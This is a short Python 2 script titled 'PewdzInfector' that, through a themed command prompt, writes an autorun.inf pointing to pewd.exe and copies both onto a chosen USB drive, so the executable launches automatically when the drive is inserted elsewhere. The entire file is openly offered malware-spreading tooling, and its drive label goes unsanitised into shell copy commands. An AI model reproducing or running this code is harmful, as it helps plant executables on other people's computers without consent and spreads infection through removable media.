#!/usr/bin/env python2
import time, sys, os
def print_leet(text):
        print("\033[92m %s" % text)
class vars:
		autorun = """
[autorun]
open=pewd.exe
icon=pewd.exe
"""
def launch():
	print_leet("""

		  Welcome to

______                _    _____       __          _
| ___ \              | |  |_   _|     / _|        | |
| |_/ /____      ____| |____| | _ __ | |_ ___  ___| |_ ___  _ __
|  __/ _ \ \ /\ / / _` |_  /| || '_ \|  _/ _ \/ __| __/ _ \| '__|
| | |  __/\ V  V / (_| |/ /_| || | | | ||  __/ (__| || (_) | |
\_|  \___| \_/\_/ \__,_/___\___/_| |_|_| \___|\___|\__\___/|_|
                                                                 
                                                                 

		  Enter a command.
		  For a list of commands,
		  please type help.
""")
	help = ("""
		 	  Commands
-----------------------------------------------------------------------------
help
	Displays this help screen.

set drive_label
	set the label of the drive. (EXAMPLE: set drive_label F:)

infect
	Infect the USB with pewd.exe.
-----------------------------------------------------------------------------
	This tool was written by NSK B3. (reddit: u/NSK_B3, twitter: @NSKXB3)

""")
	while True:
		global drive
		valid = ['help', 'set drive_label', 'infect']
		comm = raw_input("\033[92madmin@pewdzinf:~# ")
		if comm.lower() == "help":
			print_leet(help)
		elif "set drive_label" in comm.lower():
			drive = comm.lower()[15:]
			print("\033[92mDrive ==> %s" % drive)
		elif comm.lower() == "infect":
			infect_drive()
		elif comm.lower() not in valid:
			print_leet("Invalid command!")

def infect_drive():
        autorun = file("autorun.inf", "wb")
	autorun.write(vars.autorun)
	os.system("copy autorun.inf %s" % drive)
	print_leet("Copied Autorun to USB...")
	os.system("copy pewd.exe %s" % drive)
	print_leet("INFECTED USB WITH PEWD.EXE.\NTHANKS FOR USING PEWDSINFECTOR!")
launch()
